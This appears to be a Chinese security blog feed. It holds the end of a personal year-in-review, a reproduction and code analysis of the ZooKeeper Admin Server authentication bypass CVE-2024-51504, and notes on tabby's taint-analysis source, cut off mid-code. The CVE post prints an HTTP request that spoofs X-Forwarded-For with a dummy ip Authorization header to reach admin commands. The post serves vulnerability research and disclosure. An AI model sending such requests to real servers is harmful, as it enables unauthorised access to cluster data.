照我的意志进行</li><li>如若不然，就由神变为魔，欲要摧毁这个世界</li><li>发现2无法达成，就转变为攻击自己，造成抑郁<br>所以，只有婴儿认为世界应该按照自己的意志运转的，婴儿也缺乏尊重现实的能力。</li></ol><p>当然，现实情况是很复杂的，一个人同时有这两种特征也是可能的。比如一个人不敢攻击别人，遇到事就攻击自己生闷气，但在谈恋爱的过程中会狠狠攻击另一方。一旦另一方还击，就又会陷入弱势，从而无限攻击自己。比如一些男性在家外面唯唯诺诺，回到家里就大发脾气，攻击弱势的妻子儿女。</p><p>这两种特征的人群往往又对应焦虑性依恋和回避性依恋的人，而二者又相互吸引，相互绞杀。回避型依恋自幼缺少强烈感情的爱，便会错认焦虑型人格的强烈情绪为爱，于是深深被焦虑型人格吸引。而由于其年幼或遭忽视，或父母不善于表达，故情感表达能力低下（如羞于表达，恐惧表达，或麻木自身情绪等）。<br>焦虑型依恋自幼缺乏安全感，原因也来自于父母的相处模式，如忽冷忽热，情绪阴晴不定，长大后非常喜欢表现自己，从而吸引回避型，回避型人格外在的冷漠，独立，带来的稳重感就是一块稳定的基石，而给予焦虑型安全感。一旦爆发冲突，焦虑型急需爱的证明来索取安全感，衍生极端自恋的暴怒情绪，让回避型心生恐惧，逃避冲突，此举又会使焦虑型更为焦虑，二者相互绞杀，直到一方筋疲力竭，关系结束。</p><p>当然，现实情况必然是复杂的，无论如何，本质上都是全能自恋，而全能自恋的形成，则是幼年缺爱导致的。</p><p>到底什么是爱呢？我很爱我的宠物猫，但是为了让他以后不发情，我对他做了绝育手术。<br>这不叫爱，这是宠物和主人的关系不平等，主人嫌麻烦，直接剥夺了宠物的生育能力。</p><p>主人和宠物的关系可以代换到父母和孩子身上，父母严加管教孩子，这不让做那不让做，这也不叫爱，是一种自由的剥夺。父母要求孩子走他们的安排好的路，不过问孩子是否愿意，这也不叫爱。父母不理解孩子，只觉得自己提供物质就好了，而忽略孩子真实的想法和感受，这也不叫爱。这些看似是爱的行为，都不是真正的爱。<br>我们国家很讲集体主义，所以父母八成都给孩子提供自己能做到最好的物质资源，但我想很多时候，并没有那么多爱。</p><p>没有真正的理解，没有当做完整的人的尊重，没有适度的自由，但也并非无爱，太多受到伤害的人无法把愤怒扔给父母，那么此时就只能攻击自己了，抑郁者是非常多的，麻木也是非常严重的。</p><p>为什么会这样呢？则是因为父母的幼年也缺爱。所以，巨婴性格会一代传一代，代代相传。除非有一代人或意识到，或被治愈，不然会一直传下去。而且，缺不缺爱和财富多少，权力大小，社会地位高低，能力天赋等，并无必然关系，是一种普遍存在于人类身上的现象。</p><h1 id="技术进步"><a href="#技术进步" class="headerlink" title="技术进步"></a>技术进步</h1><p>刚开始按时间记录，流水账的写了一通，发现不妥，删了重写。<br>年初这会，学校管理层不知是有利益纷争还是如何，这帮人做的什么几把决策，直接给学弟搞断代，一来一回，本来CTF实力就弱，这么一搞，青黄不接，再加上我对国内某些CTF比赛实在不敢恭维，卷的毫无意义，为了出题而出题，比赛结束后，根本没复现的欲望。</p><p>所以后来就直接弃了CTF了，专注做自己的事好了。一没资源，二没氛围，我实在找不下打下去的理由，当然，话虽如此说，还是复现了相当多非常优秀的大型CTF比赛赛题，这对我的学习起了非常大的帮助，给我打下了一个坚定的基础。</p><p>然后就是不断地复现漏洞，看漏洞，到暑假尝试找个实习。因为春招没找，渗透，安服这类又不想干，就想找个安全研究相关的，还是有点忐忑的，兢兢业业投了十几家。</p><p>最后去了华云安，周五，第一天投，下午就面试，然后周一直接就通过，速度极快，我也是直接签合同，后面好几家甚至都没面试。</p><p>在北京实习的三个月，是我大学度过的最幸福的三个月，挣多少花多少，当真是无忧无虑，虽然在北京，实习公司也就勉强够糊口，但我觉得自己掌控的生活，是最为幸福的，是其他任何情况都无法代替的。</p><p>开学后长期不在，被学校抓回去了，不过好在我当时已经实习结束了，最后给了个警告处分，不了了之。不得不感慨，落后的管理制度，平庸化学生的考核标准，怪不得这学校年年退步呢，而管理层始终认为自己对。你说兢兢业业吧，作为管理层的工作确实干的很好，但为什么这么干呢？没有自己的想法，也就是不停地执行命令，维护自己的利益。这些垃圾政策在若干年后自然有垃圾后果，不过这和我没有任何关系了。</p><p>说今年有什么进步呢？相比于去年学的杂七杂八，今年就是纯粹的专注代码审计，成果里有幸挖到两大厂CVE，暑期去了实习，见了世面，同时也算是有始有终完成了一个项目，花了一个多月完成了个go的SAST。其实细看来，成果也就那点。</p><p>想了想我对技术的态度，究竟是如何的呢？</p><p>其实我并非对计算机感兴趣，我只是对网络攻防感兴趣，或者说我对攻击和防御技术感兴趣。所以学了一遍又一遍的汇编，从来没有记住过，反而是最近学习安卓逆向的时候，动手操作了一遍，那几个指令就刻在了脑海里。<br>学校只是一味地授课，教学，其实我对计算机底层原理确实不感兴趣，也对CPU的组成没啥想法，更不想了解各种数学。我只是单纯的对攻击技术，防御技术有兴趣，为了学习更多更牛逼的技术，我才会去了解相关知识，否则除了因为好奇，我根本没有看的欲望，这种教学是否是一种本末倒置呢？<br>我对攻击的漏洞有兴趣，故学习挖掘，难度越来越大，越来越高，后来我对如何挖掘有兴趣，故阅读一些工具源码，最后我想自己试试，故自己动手写代码，测试。而全程见不得多少计算机的影子，换句话说，这些计算机知识只是完成我想法的工具，是为了我的想法而服务的，而不是相反。</p><p>我想我就是离经叛道的一类人，学校不适合我，早早脱出是好事。而我只是个单纯对技术感兴趣的人罢了。</p><h1 id="最后总结"><a href="#最后总结" class="headerlink" title="最后总结"></a>最后总结</h1><p>回顾我今年的生活后，发现其实我每天的生活很平淡枯燥，不是写代码，就是看漏洞，挖漏洞。累了不想学了就玩，玩够了看会书，困了睡觉。相对于别人的精彩生活，我的生活显得单调了很多。反复阅读我上文所写，感觉其中戾气和不满略偏多。<br>我想，这应该是潜意识在告诉我，我对我当下的环境并不满意，事实上也确实如此。</p><p>所以我又在思考，为什么我要做这些思考？为什么要做出这些努力？</p><p>审视自己后发现，思考是我解决痛苦的方式。做出努力除了对安全有兴趣之外，是怕找不到理想的工作。<br>这么一看，驱动我前进的动力，掺杂的巨量的恐惧和焦虑。该如何解决呢？还是说人生本就如此。</p><p>我想这些问题，不是我现在能想明白的。总之，无论如何，平衡这些心理因素应当是我明年该做的事情，新生的疑问和思考，尚且留给未来的自己去解决。希望明年写年终总结的时候，看待今日所思所想，所困所惑，能够感叹一句：“真他妈傻逼”。</p>]]></content>
    
    
    
    <tags>
      
      <tag>life &amp; thinking</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zookeeper-Admin-Server认证绕过-CVE-2024-51504</title>
    <link href="/2024/11/08/zookeeper-Admin-Server%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2024-51504/"/>
    <url>/2024/11/08/zookeeper-Admin-Server%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2024-51504/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>下载<a href="https://archive.apache.org/dist/zookeeper/zookeeper-3.9.2/apache-zookeeper-3.9.2-bin.tar.gz">zookeeper release 3.9.2</a>, 修改.&#x2F;bin&#x2F;zkServer.sh，配置下远程debug</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731068425910.png" alt="QQ_1731068425910"></p><p>修改配置文件名为zoo.cfg，底下加两行</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">admin.server.enabled</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">admin.server.port</span> =<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>打开admin server</p><p>.&#x2F;zkServer.sh start 启动服务器。</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>.&#x2F;zkCli.sh -server 127.0.0.1:2181 连接到本地。</p><p>setAcl &#x2F; ip:127.0.0.1:cdrwa</p><p>参考：<a href="https://xiaoxiami.gitbook.io/zookeeper/zookeeper-cao-zuo-ming-ling/quan-xian-acl-ming-ling#ip192.168.1.1permissions-cao-zuo">https://xiaoxiami.gitbook.io/zookeeper/zookeeper-cao-zuo-ming-ling/quan-xian-acl-ming-ling#ip192.168.1.1permissions-cao-zuo</a></p><p>把根设置为只有127.0.0.1的才能操作。</p><p>直接访问&#x2F;commands&#x2F;snapshot， 显示未授权。</p><p>抓包后修改：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/commands/snapshot</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<br>Authorization:ip a<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;105&quot;, &quot;Not)A;Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>OFBiz.Visitor=10100<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>添加Authorization头，ip&lt;space&gt;随便，X-Forwarded-For修改后即可访问。</p><p>将127.0.0.1修改为127.0.0.2（或其他地址），返回未授权：</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731318313128.png" alt="QQ_1731318313128"></p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>官方文档有点离奇，踩了一点坑。对Admin Server部分，老版本文档提到了IPAuthenticationProvider，写的很明白就是用X-Forwarded-For作验证的，以为又是随手拈来的洞，但是配置的时候花了好长时间，新文档直接没了，有关权限和认证也写在了不在Admin Server的部分。参考了一些网上资料后，最后具体看代码分析了，稍微多花了点时间。</p><p>我还是在md里找到的：</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731318472876.png" alt="QQ_1731318472876"></p><p>在JettyAdminServer#doGet，这里截取了Authorization头信息作为authInfo，传递给了runGetCommand。</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731318593230.png" alt="QQ_1731318593230"></p><p>在Commands#runCommand：</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319012556.png" alt="QQ_1731319012556"></p><p>关键在于这个handleAuthentication（验证完后面是授权了，可以不用管）</p><p>Commands#handleAuthentication：</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319082669.png" alt="QQ_1731319082669"></p><p>用空格把Authorization头内容打成数组，第一部分是schema，决定选哪个Provider。</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319866064.png" alt="QQ_1731319866064"></p><p>默认就两。</p><p>IPAuthenticationProvider#handleAuthentication:</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319924111.png" alt="QQ_1731319924111"></p><p>authData后面也没用到，所以随便填就行，这里获取IP地址用了getClientIPAddress</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319968060.png" alt="QQ_1731319968060"></p><p><img src="/../zookeeper-authentication-bypass/QQ_1731319974435.png" alt="QQ_1731319974435"></p><p>很简单。最后返回给ids：</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731320056096.png" alt="QQ_1731320056096"></p><p>后面就是授权部分了。</p><p>Commands#handleAuthorization</p><p><img src="/../zookeeper-authentication-bypass/QQ_1731320002992.png" alt="QQ_1731320002992"></p><p>取出了acls，和ids进行对比。具体逻辑就不看了。</p><p>完。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tabby源码阅读</title>
    <link href="/2024/11/07/tabby%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <url>/2024/11/07/tabby%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>前言</p><p>看了南大的软件分析课程，还是很有意思的，顺便学了soot，终于是可以看明白tabby源码了。</p><p>soot教程见 <a href="https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/">https://fynch3r.github.io/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/</a> ，总结的挺牛逼的。</p><p>tabby分析参考：</p><p><a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/</a></p><p><a href="https://tttang.com/archive/1696/#toc_11">https://tttang.com/archive/1696/#toc_11</a></p><p>本文只记录较为关键的部分。</p><h1 id="类-方法信息搜集"><a href="#类-方法信息搜集" class="headerlink" title="类&#x2F;方法信息搜集"></a>类&#x2F;方法信息搜集</h1><p>和GadgetInspector一样，先搜集类和方法的信息。然后build调用图</p><h2 id="ClassInfoScanner-run"><a href="#ClassInfoScanner-run" class="headerlink" title="ClassInfoScanner#run"></a>ClassInfoScanner#run</h2><p><img src="/../tabby/QQ_1730963912842.png" alt="QQ_1730963912842"></p><p>先后调用了这些方法，一个一个看。</p><h3 id="loadAndExtract"><a href="#loadAndExtract" class="headerlink" title="loadAndExtract"></a>loadAndExtract</h3><p><img src="/../tabby/QQ_1730964340358.png" alt="QQ_1730964340358"></p><p>关键在于collector.collect， theClass是SootClass，这个是Soot的类。一个SootClass包含一个Java类所有相关的信息，例如这个类的类名、修饰符、父类、SootField、SootMethod链等。</p><p><img src="/../tabby/QQ_1730964480804.png" alt="QQ_1730964480804"></p><p>搜集了类和方法的信息，这里有两个作者自定义的数据结构，ClassReference和MethodReference，用于储存信息。</p><p>都是把SootClass和SootMethod提取出来，丢进xxRefence的newInstance方法构建。</p><p><img src="/../tabby/QQ_1730964564082.png" alt="QQ_1730964564082"></p><p><img src="/../tabby/QQ_1730964581154.png" alt="QQ_1730964581154"></p><p>可以看到还用到了@Column注解，用于未来保存信息到数据库。</p><p>最后MethodReference信息丢进dataContainer里，classReference的信息Return回去。</p><p>DataContainer Field如下，存放了各种需要用到的信息：</p><p><img src="/../tabby/QQ_1730966881352.png" alt="QQ_1730966881352"></p><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>主要就是把ClassRef信息丢进dataContainer里。</p><p><img src="/../tabby/QQ_1730966856205.png" alt="QQ_1730966856205"></p><h3 id="buildClassEdges"><a href="#buildClassEdges" class="headerlink" title="buildClassEdges"></a>buildClassEdges</h3><p><img src="/../tabby/QQ_1730967661907.png" alt="QQ_1730967661907"></p><p>到collectionRelationInfo</p><p><img src="/../tabby/QQ_1730967681931.png" alt="QQ_1730967681931"></p><p>可以看到处理接口，类继承，函数别名的信息。</p><p>最后是save，作者用了springboot框架，对这些信息写了Repository和Service，方便和数据库交互。具体都在这里：</p><p><img src="/../tabby/QQ_1730967822951.png" alt="QQ_1730967822951"></p><h1 id="CallGraph构建"><a href="#CallGraph构建" class="headerlink" title="CallGraph构建"></a>CallGraph构建</h1><p><img src="/../tabby/QQ_1730969190081.png" alt="QQ_1730969190081"></p><p>CallGraphCollector#collect</p><p>对于一些方法，Phantom方法，sink，忽略的，抽象方法和native方法，这些都没法分析。（sink不需要分析）直接跳过。</p><p>Phantom：</p><p><img src="/../tabby/QQ_1730969255411.png" alt="QQ_1730969255411"></p><p>然后是无参的static method，没法控制，也直接跳了。</p><p>Switcher#doAnalysis</p><p><img src="/../tabby/QQ_1730969330731.png" alt="QQ_1730969330731"></p><p>提取了method的body部分（Jimple码格式）</p><p>然后构建了BriefUnitGraph。</p><p>makeDefault里主要是new一个PollutedVarsPointsToAnalysis。这块是关键。</p><p><img src="/../tabby/QQ_1730969628115.png" alt="QQ_1730969628115"></p><p>前向分析。</p><h2 id="LiveVariablesAnalysis示例"><a href="#LiveVariablesAnalysis示例" class="headerlink" title="LiveVariablesAnalysis示例"></a>LiveVariablesAnalysis示例</h2><p>先不看这个，有点复杂，先来看怎么用soot实现LiveVariablesAnalysis</p><p><a href="https://github.com/PL-Ninja/MySootScript">https://github.com/PL-Ninja/MySootScript</a></p><p>先来看算法：<br><img src="/../tabby/QQ_1730969805331.png" alt="QQ_1730969805331"></p><p>看起来挺复杂，其实就是不断的kill掉定义的variable，并上use过的variable，具体例子可以看这个：</p><p><img src="/../tabby/QQ_1730969877934.png" alt="QQ_1730969877934"></p><p>tabby那个是正向分析，这个LiveVariablesAnalysis的实现是反向的，从后往前看。</p><p>每个框旁边有两个集合，上面是IN set， 下面是OUT set</p><p>a&#x3D;z, kill a,  add  z, 因为本来就没a，不用管它，所以IN &#x3D; {z}，然后直接把这个In set copy到b&#x3D;y的out set</p><p>b&#x3D;y, kill b, add y, 所以IN &#x3D; {z, y}</p><p>然后是对于分支操作，做union，可以看到{z, y}和{y} merge成了{z, y}</p><p>后续的y&#x3D;x也同理。最后得到z ,x 。 </p><p>如何实现的呢？</p><p><img src="/../tabby/QQ_1730970442967.png" alt="QQ_1730970442967"></p><p>先看SimpleLiveVariablesAnalysis.java</p><p><img src="/../tabby/QQ_1730970378120.png" alt="QQ_1730970378120"></p><p>merge和copy操作没啥多说的，直接调soot的api即可。</p><p><img src="/../tabby/QQ_1730970419164.png" alt="QQ_1730970419164"></p><p>flowThrough方法是实现数据流分析的函数。</p><p><img src="/../tabby/QQ_1730970504142.png" alt="QQ_1730970504142"></p><p>kill方法，重写了caseLocal，意思是在处理局部变量的时候进行的操作。</p><p>可以看到defIt是DefBoxes的iterator，DefBoxes指向了所有的定义，然后在caseLocal里，遍历后丢入kills集合。</p><p>最后调用inset.difference(kills, destSet), 这个函数的作用就是其上面的注释</p><p>destSet &#x3D; inSet - kills</p><p><img src="/../tabby/QQ_1730970713849.png" alt="QQ_1730970713849"></p><p>gen方法也差不多，把Use到的变量丢到destSet里。由于这个算法比较简单，都没有重写doAnalysis。</p><h2 id="tabby的PollutedVarsPointsToAnalysis"><a href="#tabby的PollutedVarsPointsToAnalysis" class="headerlink" title="tabby的PollutedVarsPointsToAnalysis"></a>tabby的PollutedVarsPointsToAnalysis</h2><p>有了简单的例子后，再看tabby的实现就比较轻松了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAnalysis</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">for</span>(ValueBox box:body.getUseAndDefBoxes())&#123;<br>            <span class="hljs-type">Value</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> box.getValue();<br>            <span class="hljs-type">Type</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> value.getType();<br>            <span class="hljs-keyword">if</span>(type <span class="hljs-keyword">instanceof</span> PrimType)&#123; <span class="hljs-comment">// 对于基础数据类型 直接跳过</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(value <span class="hljs-keyword">instanceof</span> Local &amp;&amp; !initialMap.containsKey(value))&#123;<br>                initialMap.put((Local) value, TabbyVariable.makeLocalInstance((Local) value));<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(value <span class="hljs-keyword">instanceof</span> InstanceFieldRef)&#123;<br>                <span class="hljs-type">InstanceFieldRef</span> <span class="hljs-variable">ifr</span> <span class="hljs-operator">=</span> (InstanceFieldRef) value;<br>                <span class="hljs-type">SootField</span> <span class="hljs-variable">sootField</span> <span class="hljs-operator">=</span> ifr.getField();<br>                <span class="hljs-type">SootFieldRef</span> <span class="hljs-variable">sfr</span> <span class="hljs-operator">=</span> ifr.getFieldRef();<br><br>                <span class="hljs-type">String</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">if</span>(sootField != <span class="hljs-literal">null</span>)&#123;<br>                    signature = sootField.getSignature();<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sfr != <span class="hljs-literal">null</span>)&#123;<br>                    signature = sfr.getSignature();<br>                &#125;<br><br>                <span class="hljs-type">Value</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> ifr.getBase();<br>                <span class="hljs-keyword">if</span>(base <span class="hljs-keyword">instanceof</span> Local)&#123;<br>                    <span class="hljs-type">TabbyVariable</span> <span class="hljs-variable">baseVar</span> <span class="hljs-operator">=</span> initialMap.get(base);<br>                    <span class="hljs-keyword">if</span>(baseVar == <span class="hljs-literal">null</span>)&#123;<br>                        baseVar = TabbyVariable.makeLocalInstance((Local) base);<br>                        initialMap.put((Local) base, baseVar);<br>                    &#125;<br>                    <span class="hljs-type">TabbyVariable</span> <span class="hljs-variable">fieldVar</span> <span class="hljs-operator">=</span> baseVar.getField(signature);<br>                    <span class="hljs-keyword">if</span>(fieldVar == <span class="hljs-literal">null</span>)&#123;<br>                        <span class="hljs-keyword">if</span>(sootField != <span class="hljs-literal">null</span>)&#123;<br>                            fieldVar = TabbyVariable.makeFieldInstance(baseVar, sootField);<br>                        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sfr != <span class="hljs-literal">null</span>)&#123;<br>                            fieldVar = TabbyVariable.makeFieldInstance(baseVar, sfr);<br>                        &#125;<br>                        <span class="hljs-keyword">if</span>(fieldVar != <span class="hljs-literal">null</span> &amp;&amp; signature != <span class="hljs-literal">null</span>)&#123;<br>                            fieldVar.setOrigin(value);<br>                            baseVar.addField(signature, fieldVar);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(value <span class="hljs-keyword">instanceof</span> ArrayRef)&#123;<br>                <span class="hljs-type">ArrayRef</span> <span class="hljs-variable">v</span> <span class="hljs-operator">=</span> (ArrayRef) value;<br>                <span class="hljs-type">Value</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> v.getBase();<br>                <span class="hljs-keyword">if</span>(base <span class="hljs-keyword">instanceof</span> Local)&#123;<br>                    <span class="hljs-type">TabbyVariable</span> <span class="hljs-variable">baseVar</span> <span class="hljs-operator">=</span> initialMap.get(base);<br>                    <span class="hljs-keyword">if</span>(baseVar == <span class="hljs-literal">null</span>)&#123;<br>                        baseVar = TabbyVariable.makeLocalInstance((Local) base);<br>                        initialMap.put((Local) base, baseVar);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">super</span>.doAnalysis();<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里获取了所有的Use和Def，然后对基础类型，局部变量，势利Field和数组四种数据类型进行判断，（基础类型直接跳，不分析），处理好后丢进InitialMap里。</p><p>flowThrough：</p><p>前面是一些性能相关的，关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Local, TabbyVariable&gt; newIn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">// TODO debug</span><br>copy(in, newIn);<br>context.setLocalMap(newIn);<br>context.setInitialMap(initialMap);<br>stmtSwitcher.setContext(context);<br>stmtSwitcher.setDataContainer(dataContainer);<br>d.apply(stmtSwitcher);<br>out.putAll(clean(context.getLocalMap()));<br></code></pre></td></tr></table></figure><p>可以看到给Unit apply了stmtSwitcher，这个在makeDefault初始化的时候设置为SimpleStmtSwitcher</p><p><code>StmtSwitcher</code>的实现类为<code>SimpleStmtSwitcher</code>，代码中主要处理了<code>InvokeStmt</code>、<code>AssignStmt</code>、<code>IdentityStmt</code>、<code>ReturnStmt</code>四种类型的实现，对应着方法调用、赋值、定义、返回四种类型的jimple语句</p><h2 id="SimpleStmtSwitcher"><a href="#SimpleStmtSwitcher" class="headerlink" title="SimpleStmtSwitcher"></a>SimpleStmtSwitcher</h2><h3 id="caseAssignStmt"><a href="#caseAssignStmt" class="headerlink" title="caseAssignStmt"></a>caseAssignStmt</h3><p><img src="/../tabby/QQ_1730985242103.png" alt="QQ_1730985242103"></p><p>分为左值右值，分别实现了一个valueSwitcher。先看SimpleRightValueSwitcher</p><p><img src="/../tabby/QQ_1730985411605.png" alt="QQ_1730985411605"> </p><p>局部变量，static，field和函数的。没啥说的。</p><p><img src="/../tabby/QQ_1730985801847.png" alt="QQ_1730985801847"></p><p>对于Array类型的，通过index获取。但是index是local的情况下没办法推算值，这块功能没实现。所以直接把整个数组setResult了。这样会可能会导致误报增多。</p><p>再看Left的，Left这边有点复杂，先从caseLocal看：</p><p><img src="/../tabby/QQ_1730986890090.png" alt="QQ_1730986890090"></p><p>这个unbind是caseAssign里的变量，如果右值是CONSTANT或者StringCONSTANT，unbind就为true。很明显这两个类型没法污点传播。</p><p>generateAction：</p><p><img src="/../tabby/QQ_1730986969983.png" alt="QQ_1730986969983"></p><p>这里就到了action表了，关于这部分的内容见KCON 2022 tabby的ppt，或者<a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/</a></p><p>如果右值是被污染的，并且unbind为true。设置action为clear，意思是没用。</p><p>如果左值被污染，unbind为false，再判断右值是否被污染，如果右值被污染，正常addaction即可；如果右值没被污染，就设置action为clear</p><p>为什么要有第三种情况呢？假如说有这种情况：</p><p>a &#x3D; [EvilInput]</p><p>a &#x3D; b</p><p>此时b不是被污染的，a被重新赋值，虽然a是被污染的，但是a也没用了，所以设置action为clear。</p><p>然后回到caseLocal，unbind为true， clear左值信息，不是的话把右值赋值给左值。</p><p>其他大同小异，不做赘述了。</p><h3 id="caseIdentityStmt"><a href="#caseIdentityStmt" class="headerlink" title="caseIdentityStmt"></a>caseIdentityStmt</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">caseIdentityStmt</span><span class="hljs-params">(IdentityStmt stmt)</span> &#123;<br>    <span class="hljs-type">Value</span> <span class="hljs-variable">lop</span> <span class="hljs-operator">=</span> stmt.getLeftOp();<br>    <span class="hljs-type">Value</span> <span class="hljs-variable">rop</span> <span 